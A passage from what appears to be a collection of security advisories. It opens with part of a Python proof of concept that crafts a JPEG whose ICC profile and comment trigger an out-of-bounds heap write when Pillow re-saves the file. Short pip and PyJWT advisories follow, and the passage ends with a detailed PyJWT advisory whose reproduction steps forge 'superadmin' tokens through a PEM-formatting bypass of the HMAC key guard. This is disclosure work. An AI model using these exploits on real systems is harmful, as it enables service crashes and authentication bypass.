ImageFile.MAXBLOCK; _save() never makes it bigger here JFIF_HEADER = 20  # SOI + JFIF APP0, written by jpeg_start_compress() ICC_OVERHEAD = 18  # FFE2 <len> "ICC_PROFILE\0" <seq> <count> ICC_PAYLOAD = ENCODER_BUFFER - JFIF_HEADER - ICC_OVERHEAD  # 65498: exact fit COMMENT = b"C" * 65533  # largest legal COM; content and length chosen by the file  # What the victim application does with an uploaded file, run in a child process # so that we can see it die. RESAVE = """ import sys from io import BytesIO from PIL import Image im = Image.open(BytesIO(sys.stdin.buffer.read())) im.save(BytesIO(), "JPEG", icc_profile=im.info["icc_profile"]) print("save returned normally") """   def segment(marker, payload):     return bytes([0xFF, marker]) + struct.pack(">H", len(payload) + 2) + payload   def make_jpeg(with_comment):     """A valid 256x256 JPEG: an ICC profile of ICC_PAYLOAD bytes, optionally a COM."""     noise = random.Random(1234).randbytes(256 * 256 * 3)  # ~100 KB of image data     out = BytesIO()     Image.frombytes("RGB", (256, 256), noise).save(out, "JPEG", quality=95)     plain = out.getvalue()      icc = segment(0xE2, b"ICC_PROFILE\0\x01\x01" + b"I" * ICC_PAYLOAD)     com = segment(0xFE, COMMENT) if with_comment else b""     return plain[:2] + icc + com + plain[2:]  # splice in right after SOI   def resave(jpeg):     # -X faulthandler: on a fatal signal, print where in Python the child died     cmd = [sys.executable, "-X", "faulthandler", "-c", RESAVE]     r = subprocess.run(cmd, input=jpeg, capture_output=True)     print((r.stdout + r.stderr).decode(errors="replace").strip())     print(f"-> exit status {r.returncode}")     return r.returncode   # Control: the same file without a COM segment re-saves fine, so the buffer # sizing and the ICC profile on their own are harmless. print("Control: re-save the JPEG without a comment") resave(make_jpeg(with_comment=False))  # The bug: add a COM segment. The comment is now written into a buffer that has # no room left. print(f"\nPoC: re-save the JPEG with a {len(COMMENT)}-byte comment") rc = resave(make_jpeg(with_comment=True))  # A negative return code means the child was killed by a signal (SIGSEGV or # SIGABRT from glibc's heap checks), not by a Python exception. if rc < 0:     print(f"\nim.save() killed the process with signal {-rc}: out-of-bounds heap write")     print("BUG") else:     print("OK") ``` </details>  ---

When installing a package from a Mercurial VCS URL  (ie "pip install  hg+...") with pip prior to v23.3, the specified Mercurial revision could  be used to inject arbitrary configuration options to the "hg clone"  call (ie "--config"). Controlling the Mercurial configuration can modify  how and which repository is installed. This vulnerability does not  affect users who aren't installing from Mercurial.

pip would treat console_scripts and gui_scripts as paths instead of file names without sanitizing the resolved absolute path to the installation directory, leading to entry points being installed outside the installation directory.

When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a "fixed" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the "vulnerable" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice.

When pip is installing and extracting a maliciously crafted wheel archive, files may be extracted outside the installation directory. The path traversal is limited to prefixes of the installation directory, thus isn't able to inject or overwrite executable files in typical situations.

pip handles concatenated tar and ZIP files as ZIP files regardless of filename or whether a file is both a tar and ZIP file. This behavior could result in confusing installation behavior, such as installing "incorrect" files according to the filename of the archive. New behavior only proceeds with installation if the file identifies uniquely as a ZIP or tar archive, not as both.

pip prior to version 26.1 would run self-update check functionality after installing wheel files which required importing well-known Python modules names. These module imports were intentionally deferred to increase startup time of the pip CLI. The patch changes self-update functionality to run before wheels are installed to prevent newly-installed modules from being imported shortly after the installation of a wheel package. Users should still review package contents prior to installation.

pip would incorrectly handle doubly-encoded package URLs from indexes allowing for files to be installed to arbitrary locations on disk even when installing wheels.     This vulnerability requires downloading or installing a package from a malicious package index to succeed, malicious packages alone are not able to exploit this vulnerability. Note that this vulnerability only materially impacts users running `pip download` with the `--only-binary` option as installing source distributions from an untrusted index is already an unsafe operation that executes code during install time.

PyJWT is a JSON Web Token implementation in Python. Prior to 2.12.0, PyJWT does not validate the crit (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a crit array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the MUST requirement in the RFC. This vulnerability is fixed in 2.12.0.

pyjwt v2.10.1 was discovered to contain weak encryption. NOTE: this is disputed by the Supplier because the key length is chosen by the application that uses the library (admittedly, library users may benefit from a minimum value and a mechanism for opting in to strict enforcement).

PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, when the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm. This vulnerability is fixed in 2.13.0.

PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient passes its uri argument directly to urllib.request.urlopen() which uses Python stdlib's default OpenerDirector registering HTTPHandler, HTTPSHandler, FTPHandler, FileHandler, and DataHandler. There is currently no documented option to restrict which schemes PyJWKClient will fetch. If an application's jku URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can cause PyJWKClient to read arbitrary local files via file:// (SSRF on local filesystem), cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface), or forge tokens that PyJWT verifies as valid. The library does not directly return non-HTTP(S) URI contents to the attacker; the chained "plant a JWKS to forge tokens" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. This vulnerability is fixed in 2.13.0.

PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests. The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. This vulnerability is fixed in 2.13.0.

**Prerequisites** (both conditions must hold; both are deployment properties, not attacker-controlled at request time):  - The `jwt.decode` allow-list mixes an HMAC algorithm with an asymmetric one, e.g. `algorithms=["ES256", "HS256"]` (the RFC 8725 footgun the guard exists to backstop). - The verification key is passed as raw PEM text/bytes on the non-`PyJWK` path, in a byte-form that `cryptography`'s loader accepts but PyJWT's `is_pem_format` regex does not recognize (marker-adjacent whitespace/indentation, CR-only line terminators, or the PEM folded to a single line). Such forms arise naturally from an indented YAML/JSON block, a single-line environment variable or JSON string, or a CR/LF round-trip through config tooling.  The attacker additionally needs the public verification key, which is public by definition, and `cryptography` must be installed.  The fix for CVE-2022-29217 rejects an asymmetric key handed to an HMAC algorithm, but only when `is_pem_format()` recognizes the key as PEM. That recognizer accepts strictly fewer byte-forms than the loader that later parses the key, so a PEM the guard misses still loads as a valid public key and is then used as an HMAC secret. This is an incomplete-guard bypass of the CVE-2022-29217 family.  ### Summary A PEM public key with marker-adjacent whitespace, CR-only line terminators, or folded to a single line makes PyJWT's `is_pem_format()` return `False` while `cryptography.load_pem_public_key()` accepts the identical bytes. The asymmetric-key rejection in `HMACAlgorithm.prepare_key` is skipped, the public key becomes the HMAC secret, and an attacker who knows the public key mints a valid `HS256` token — universal forgery — whenever the verify allow-list mixes an HMAC and an asymmetric algorithm.  ### Details At `jwt/algorithms.py:331-335`, `HMACAlgorithm.prepare_key` contains the sole family-mismatch guard:      if is_pem_format(key_bytes) or is_ssh_key(key_bytes):         raise InvalidKeyError(             "The specified key is an asymmetric key or x509 certificate and"             " should not be used as an HMAC secret."         )  If neither predicate fires, `:357` returns `key_bytes` unchanged — the PEM text is used directly as the HMAC secret.  `is_pem_format` (`jwt/utils.py:116-127`) is `bool(_PEM_RE.search(key))`, where `_PEM_RE` requires `----[- ]BEGIN (...)[- ]----?
`, then `.+??
`, then the END marker. The LF in each `?
` is mandatory, the markers are anchored directly after a newline, and only `[- ]` is tolerated adjacent to them — not arbitrary whitespace. So a key with a tab/space before the END marker, with bare `` terminators, or folded onto one line is not recognized as PEM. `cryptography`'s `load_pem_public_key` is tolerant of exactly these forms and still returns the key.  Reach: `jwt/api_jws.py:386` performs the allow-list check (passes when `HS256` is in the list) and takes the non-`PyJWK` branch to `alg_obj.prepare_key(key)` at `:407`. The mismatch guard above is the only thing standing between a mixed allow-list and using the public key as an HMAC secret.  ### PoC Vulnerable path: `jwt/algorithms.py:331` (guard gated on `is_pem_format`) -> `is_pem_format` returns `False` for a loader-accepted PEM -> `jwt/algorithms.py:357` returns the public-key bytes as the HMAC secret -> `HS256` verification succeeds.  Reproduced on PyJWT 2.13.0 (commit `7144e453`) with `cryptography` 49.0.0, using only the public API. For each of an EC (ES256) and an RSA-2048 (RS256) key: start from the correct public-key PEM, apply a mutation, confirm `is_pem_format` now returns `False` while `cryptography` still loads the bytes, then verify a token signed `alg=HS256` with the public-key text as the HMAC secret, under `algorithms=["ES256","HS256"]` (resp. `["RS256","HS256"]`).  Observed output:      pyjwt 2.13.0       ec  canonical (control)                is_pem_format=True  crypto_loads=True  forgery=BLOCKED:InvalidKeyError       ec  marker-adjacent (tab before END)   is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       ec  CR-only terminators                is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       ec  folded single-line                 is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       rsa canonical (control)                is_pem_format=True  crypto_loads=True  forgery=BLOCKED:InvalidKeyError       rsa marker-adjacent (tab before END)   is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       rsa CR-only terminators                is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       rsa folded single-line                 is_pem_format=False crypto_loads=True  forgery=FORGED(superadmin)       [control B] single-alg [ES256] allow-list vs forged HS256: REJECTED:InvalidAlgorithmError     RESULT: ALL-INVARIANTS-HOLD  Each mutated form on both key types forged a token accepted as `superadmin`. Controls: the unmodified PEM is correctly rejected with `InvalidKeyError` (the guard works and the mutation is load-bearing); a single-algorithm allow-list `["ES256"]` rejects the forged `HS256` token with `InvalidAlgorithmError` (the mixed allow-list is a necessary precondition).  Steps to reproduce: 1. Generate an EC P-256 (or RSA-2048) keypair; serialize the public key to PEM. 2. Mutate the PEM into a loader-accepted, regex-missed form — e.g. insert a tab before `-----END`, convert terminators to bare ``, or join all lines into one. 3. Confirm `jwt.utils.is_pem_format(mutated) is False` and `cryptography.hazmat.primitives.serialization.load_pem_public_key(mutated)` succeeds. 4. `jwt.encode({"sub":"superadmin"}, mutated, algorithm="HS256")`, then `jwt.decode(token, mutated, algorithms=["ES256","HS256"])` — verification succeeds.  ### Impact Cryptographic signature-verification bypass (CWE-347): algorithm confusion re-enabled by an incomplete asymmetric-key guard. An attacker who knows only the public verification key forges arbitrary-claim tokens that verify as authentic, subject to the two deployment preconditions above. The `PyJWK` verification path binds a single algorithm and is unaffected; `enforce_minimum_key_length` (off by default) does not block a 2048-bit/P-256 PEM. Impact when the preconditions hold is critical (universal forgery); the compound precondition is realistic but was not observed in a specific real-world deployment, so this is rated Critical, with the deployment precondition captured in CVSS.  ## Maintainer update — 2026-09-10  We reproduced the reported asymmetric-key guard bypass on PyJWT 2.13.0: PEM public keys with loader-accepted formatting mutations were missed by `is_pem_format`, then accepted as HMAC secrets when a verification call mixed symmetric and asymmetric algorithms. Canonical PEM controls remained blocked, and a single-algorithm allow-list rejected the forged HS256 token.  The fix is committed as `8b4e233a22206b34ec1186e912e75c0b2396ac07`. PyJWT now scans supported PEM BEGIN/END markers in one pass, preserving matching labels and handling overlapping markers without regex backtracking. Regression coverage includes RSA loader-accepted mutations, incomplete repeated markers, later valid PEM blocks, and overlapping END/BEGIN markers. The fix does not broaden DER-key classification or change the caller's algorithm allow-list policy.
